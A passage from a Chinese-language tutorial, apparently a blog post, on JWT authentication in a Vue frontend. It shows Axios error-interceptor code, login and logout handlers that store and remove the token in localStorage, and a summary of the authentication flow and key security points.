          ElMessage.<span class="hljs-type">error</span>(<span class="hljs-string">'权限不足'</span>)
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">500</span>:
          <span class="hljs-comment">// 服务器错误</span>
          ElMessage.<span class="hljs-type">error</span>(<span class="hljs-string">'服务器错误'</span>)
          <span class="hljs-keyword">break</span>;
      }
    }
    <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-type">error</span>);
  }
);
AI写代码
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>401</code> 状态码表示 Token 无效或过期</li>
<li>收到 401 时，先删除本地 Token，然后跳转登录页</li>
<li><code>window.location.reload()</code>：刷新页面，清除所有状态</li>
</ul>
<h3 data-id="heading-15"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3 登录流程实现</h3>
<p>在登录页面中，调用登录接口并保存 Token：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/user/login'</span>, {
      <span class="hljs-attr">username</span>: loginForm.<span class="hljs-property">username</span>,
      <span class="hljs-attr">password</span>: loginForm.<span class="hljs-property">password</span>,
    })
​
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
      <span class="hljs-comment">// 保存 Token 到 localStorage</span>
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, res.<span class="hljs-property">token</span>)
      
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'登录成功'</span>)
      
      <span class="hljs-comment">// 跳转到首页</span>
      router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/'</span>)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(res.<span class="hljs-property">info</span> || <span class="hljs-string">'登录失败'</span>)
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'登录失败，请检查网络'</span>)
  }
}
<span class="hljs-variable constant_">AI</span>写代码
</code></pre>
<h3 data-id="heading-16"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4 退出登录</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogout</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 删除 Token</span>
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>)
  
  <span class="hljs-comment">// 跳转到登录页</span>
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
  
  <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'已退出登录'</span>)
}
<span class="hljs-variable constant_">AI</span>写代码
</code></pre>
<h2 data-id="heading-17"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>五、完整的认证流程</h2>
<h3 data-id="heading-18"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1 流程图</h3>
<pre><code class="hljs"/></pre>
<h3 data-id="heading-19"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2 认证流程详解</h3>
<p><strong>①登录阶段</strong>：</p>
<ul>
<li>用户在前端输入用户名和密码</li>
<li>前端调用登录接口，发送用户名密码</li>
<li>后端验证用户名密码，生成 JWT Token</li>
<li>前端接收 Token，存储到 localStorage</li>
</ul>
<p><strong>②请求阶段</strong>：</p>
<ul>
<li>前端发起 API 请求</li>
<li>Axios 请求拦截器自动从 localStorage 获取 Token</li>
<li>在请求头中添加 <code>Authorization: Bearer {token}</code></li>
<li>后端接收请求，验证 Token 签名</li>
<li>验证通过后，从 Token 中解析用户信息</li>
<li>后端返回数据</li>
</ul>
<p><strong>③Token 过期处理</strong>：</p>
<ul>
<li>如果 Token 过期，后端返回 401</li>
<li>前端响应拦截器捕获 401</li>
<li>删除本地 Token，跳转登录页</li>
</ul>
<h2 data-id="heading-20"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>六总结</h2>
<p>JWT 是一种非常适合前后端分离架构的鉴权方案，它具有无状态、跨域友好、易于扩展等优点。</p>
<p><strong>核心要点</strong>：</p>
<ul>
<li>JWT 由 Header、Payload、Signature 三部分组成</li>
<li>使用 <code>Bearer {token}</code> 格式在请求头中传递 Token</li>
<li>Token 只是 Base64 编码，不要放敏感信息</li>
<li>生产环境必须使用 HTTPS 和强密钥</li>
<li>实现 Token 刷新机制提升用户体验</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>